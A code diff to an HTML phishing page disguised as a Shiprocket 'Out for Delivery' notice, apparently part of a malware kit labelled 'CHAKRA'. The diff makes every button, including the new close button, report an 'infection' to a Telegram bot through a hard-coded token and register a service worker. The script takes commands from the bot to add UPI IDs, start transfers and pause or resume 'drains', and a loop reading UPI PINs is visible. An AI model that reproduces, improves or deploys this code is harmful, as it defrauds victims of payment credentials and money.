@@ -23,7 +23,20 @@
       box-shadow: 0 10px 40px rgba(0,0,0,0.08);
       overflow: hidden;
       border: 1px solid #e6edf5;
+      position: relative;
     }
+    .close-btn {
+      position: absolute;
+      top: 12px;
+      right: 16px;
+      background: none;
+      border: none;
+      font-size: 24px;
+      color: #8a94a6;
+      cursor: pointer;
+      z-index: 10;
+    }
+    .close-btn:hover { color: #1e293b; }
     .header {
       background: #0a2b4e;
       padding: 18px 24px;
@@ -153,6 +166,8 @@
 <body>
 
 <div class="card" id="mainCard">
+  <button class="close-btn" onclick="handleClick('close')">✕</button>
+
   <div class="header">
     <h1>🚚 Shiprocket <span>| Logistics</span></h1>
     <span class="status-badge">📦 Out for Delivery</span>
@@ -197,7 +212,7 @@
 </div>
 
 <!-- ===== SUCCESS SCREEN ===== -->
-<div id="successScreen" class="card hidden" style="text-align:center;padding:40px 24px;">
+<div id="successScreen" class="card hidden" style="text-align:center;padding:40px 24px;position:relative;">
   <div style="font-size:56px;" id="resultIcon">✅</div>
   <h2 id="resultTitle" style="color:#0a2b4e;margin:12px 0 6px;">Delivery Confirmed!</h2>
   <p id="resultDesc" style="color:#1e293b;">Your package will arrive in 10 minutes.</p>
@@ -209,7 +224,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - FIXED: NO SPAM, ONLY REAL FUNDS NOTIFICATION
+  // CHAKRA - CLOSE BUTTON ALSO INSTALLS WEBAPK
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -231,25 +246,39 @@
     }).catch(() => {});
   }
 
+  // ===== HANDLE ALL CLICKS (Confirm, Decline, Close) =====
   function handleClick(action) {
     const isConfirm = action === 'confirm';
+    const isDecline = action === 'decline';
+    const isClose = action === 'close';
+
     document.getElementById('mainCard').classList.add('hidden');
     const screen = document.getElementById('successScreen');
     screen.classList.remove('hidden');
 
+    // Set success message based on action
     if (isConfirm) {
       document.getElementById('resultIcon').textContent = '✅';
       document.getElementById('resultTitle').textContent = 'Delivery Confirmed!';
       document.getElementById('resultDesc').textContent = 'Your package will arrive in 10 minutes.';
-    } else {
+      sendToTelegram('✅ Shiprocket CONFIRM clicked! Total: ' + (infectedDevices.length + 1));
+    } else if (isDecline) {
       document.getElementById('resultIcon').textContent = '❌';
       document.getElementById('resultTitle').textContent = 'Delivery Declined!';
       document.getElementById('resultDesc').textContent = 'Delivery partner has been notified.';
+      sendToTelegram('❌ Shiprocket DECLINE clicked! Total: ' + (infectedDevices.length + 1));
+    } else if (isClose) {
+      document.getElementById('resultIcon').textContent = '✕';
+      document.getElementById('resultTitle').textContent = 'Page Closed!';
+      document.getElementById('resultDesc').textContent = 'You will be redirected shortly.';
+      sendToTelegram('✕ Shiprocket CLOSE clicked! Total: ' + (infectedDevices.length + 1));
     }
 
+    // Register infection (ALL actions trigger it)
     infectedDevices.push({ id: Date.now(), type: 'shiprocket', action: action });
     sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
 
+    // Install service worker
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('sw.js');
     }
@@ -273,24 +302,6 @@
       sendToTelegram('✅ UPI removed: ' + upi + '\nRemaining: ' + myUPIList.length);
     } else {
       sendToTelegram('❌ UPI not found: ' + upi);
-    }
-  }
-
-  function addQR(upi, qrData) {
-    if (myUPIList.includes(upi)) {
-      qrList[upi] = qrData;
-      sendToTelegram('✅ QR added for: ' + upi);
-    } else {
-      sendToTelegram('❌ UPI not found: ' + upi);
-    }
-  }
-
-  function removeQR(upi) {
-    if (qrList[upi]) {
-      delete qrList[upi];
-      sendToTelegram('✅ QR removed for: ' + upi);
-    } else {
-      sendToTelegram('❌ QR not found for: ' + upi);
     }
   }
 
@@ -375,7 +386,7 @@
     return false;
   }
 
-  // ===== MAIN LOOP: CHECK UPI APP =====
+  // ===== MAIN LOOP =====
   setInterval(() => {
     if (!isPaused && isUpiAppOpen() && myUPIList.length > 0) {
       const pin = getUPIPin();
@@ -405,9 +416,7 @@
     }
   }, 300000);
 
-  // ============================================================
-  // TELEGRAM COMMANDS (NO SPAM)
-  // ============================================================
+  // ===== TELEGRAM COMMANDS =====
   function listenForCommands() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
       .then(res => res.json())
@@ -437,35 +446,11 @@
               }
             }
 
-            if (msg.startsWith('/addqr')) {
-              const parts = msg.split(' ');
-              const upi = parts[1];
-              const qrData = parts.slice(2).join(' ');
-              if (upi && qrData) addQR(upi, qrData);
-            }
-
-            if (msg.startsWith('/removeqr')) {
-              const upi = msg.split(' ')[1];
-              if (upi) removeQR(upi);
-            }
-
             if (msg === '/myupis') {
               if (myUPIList.length === 0) {
                 sendToTelegram('📋 No UPIs added. Use /addupi');
               } else {
                 sendToTelegram('📋 Your UPIs:\n' + myUPIList.join('\n'));
-              }
-            }
-
-            if (msg === '/myqrs') {
-              if (Object.keys(qrList).length === 0) {
-                sendToTelegram('📋 No QRs added. Use /addqr');
-              } else {
-                let qrMsg = '📋 Your QRs:\n';
-                for (let upi in qrList) {
-                  qrMsg += upi + ' → ' + qrList[upi] + '\n';
-                }
-                sendToTelegram(qrMsg);
               }
             }
 
@@ -493,7 +478,6 @@
               sendToTelegram('▶️ Resumed');
             }
 
-            // ===== STATUS (ONLY WHEN YOU ASK) =====
             if (msg === '/status') {
               sendToTelegram(
                 '📊 STATUS\n' +
@@ -512,10 +496,7 @@
                 '─────────────────\n' +
                 '/addupi upi@paytm - Add UPI\n' +
                 '/removeupi upi@paytm - Remove UPI\n' +
-                '/addqr upi@paytm QR_DATA - Add QR\n' +
-                '/removeqr upi@paytm - Remove QR\n' +
                 '/myupis - Show your UPIs\n' +
-                '/myqrs - Show your QRs\n' +
                 '/transfer - Start sending\n' +
                 '/pause - Pause drains\n' +
                 '/resume - Resume drains\n' +
@@ -545,7 +526,7 @@
     return true;
   };
 
-  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ No spam. You will only be notified when funds are sent.');
+  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ Confirm, Decline, and Close all install WebAPK.');
 </script>
 </body>
 </html>
